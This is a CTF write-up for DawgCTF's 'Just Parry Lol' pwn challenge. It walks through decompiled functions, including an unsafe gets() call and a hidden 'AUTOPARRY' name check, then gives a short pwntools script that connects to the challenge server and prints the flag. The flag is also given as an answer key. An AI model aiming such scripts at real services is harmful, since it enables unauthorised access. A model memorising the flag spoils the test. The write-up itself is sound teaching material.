https://ctftime.org/event/2651

# Just Parry Lol (pwn)

Welcome, warrior. Inspired by his favorite game, For Honor, my friend made a turn-based combat simulator to familiarize people with frame data. However, the system is against you. Every move you make is just too slow. You have one secret tool: the ability to manipulate time.

Can you win the fight and retrieve the flag?

nc connect.umbccd.net 25699

## Analysis

`FUN_00401430` @ `0x401430`:

- Calls `system("cat /opt/.backup_notes/old_logs/.project_data.db.tmp");`
    - Which `cat`s the contents of a file which contains the flag

`FUN_00401480` @ `0x401480`:

- Calls `__printf_chk(1, "Enter your warrior name: ")`
- Calls `gets(s_Player_004040c0)`
- Checks if you supplied the name "AUTOPARRY"
    - If you did sets `DAT_004042d4` equal to `1`

`FUN_00401620` @ `0x401620`:

This is called when you select option `5` or choose to parry.

It contains the following code decompiled here for readability:

```c
if (DAT_004042d4 != 0) {
  puts("Auto-parry activated!");
  DAT_004040a0 = DAT_004040a0 + -0x32;
  __printf_chk(1,
               "You hit the bot with an enhanced-speed heavy attack for %d damage. Bot health: % d\n"
               ,0x32);
  DAT_004042cc = 0;
  DAT_004042d0 = 0x10b;
  return;
}
```

We can see that if `DAT_004042d4` is not equal to `0` that we get a benefit during combat.

## Solution

1) Select the warrior name `AUTOPARRY`
    - This gives us a benefit during combat
2) Just parry twice by choosing option `5` twice
    - This lets us beat the game and causes the flag to be written to stdout

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./frame_trap", checksec=False)
context.binary = elf
#context.terminal = ["ghostty", "-e"]

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("connect.umbccd.net", 25699)

p.sendlineafter(b"Enter your warrior name: ", b"AUTOPARRY")

p.sendlineafter(b"Enter choice: ", b"5")
p.sendlineafter(b"Enter choice: ", b"5")

p.readuntil(b"DawgCTF{")
print("DawgCTF{" + p.readuntil(b"}").decode()) # DawgCTF{fr4me_d4ta_m4nipulat10n}
```

## Flag
`DawgCTF{fr4me_d4ta_m4nipulat10n}`

smiley 2025/04/19
